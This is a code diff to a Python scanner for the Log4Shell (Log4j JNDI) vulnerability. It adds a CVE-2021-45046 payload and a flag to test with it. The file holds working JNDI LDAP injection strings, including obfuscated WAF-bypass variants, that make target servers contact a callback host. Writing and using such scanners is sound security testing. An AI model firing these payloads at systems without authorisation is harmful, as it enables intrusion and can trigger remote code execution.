@@ -66,6 +66,10 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${env:{{ENV_NAME}}:-j}ndi${env:{{ENV_NAME}}:-:}${env:{{ENV_NAME}}:-l}dap${env:{{ENV_NAME}}:-:}//{{callback_host}}/{{random}}}",
                        "${jnd${sys:{{SYS_PROP}}:-i}:ldap:/{{callback_host}}/{{random}}}"]
 
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}" # Source: https://twitter.com/marcioalm/status/1471740771581652995
+                 ]  
+
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
@@ -73,7 +77,7 @@ parser.add_argument("-u", "--url",
                     action='store')
 parser.add_argument("-p", "--proxy",
                     dest="proxy",
-                    help="send requests through proxy",
+                    help="Send requests through proxy. proxy should be specified in the format supported by requests (http[s]://<proxy-ip>:<proxy-port>)",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -111,6 +115,10 @@ parser.add_argument("--custom-waf-bypass",
                     required=False,
                     dest="custom_waf_bypass",
                     help="Input your custom WAF bypass string")
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
+                    action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
                     help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
@@ -131,6 +139,7 @@ args = parser.parse_args()
 proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
+
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -284,6 +293,8 @@ def scan_url(url, callback_host):
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     if args.custom_waf_bypass:
         payloads.extend(custom_waf_payloads(args.custom_waf_bypass))
+    if args.cve_2021_45046:
+        payloads = cve_2021_45046
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
@@ -344,7 +355,7 @@ def main():
     dns_callback_host = ""
     if args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  args.custom_dns_callback_host
+        dns_callback_host = args.custom_dns_callback_host
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
@@ -369,7 +380,7 @@ def main():
     time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
-        cprint("[•] Targets does not seem to be vulnerable.", "green")
+        cprint("[•] Reachable Targets do not seem to be vulnerable.", "green")
     else:
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
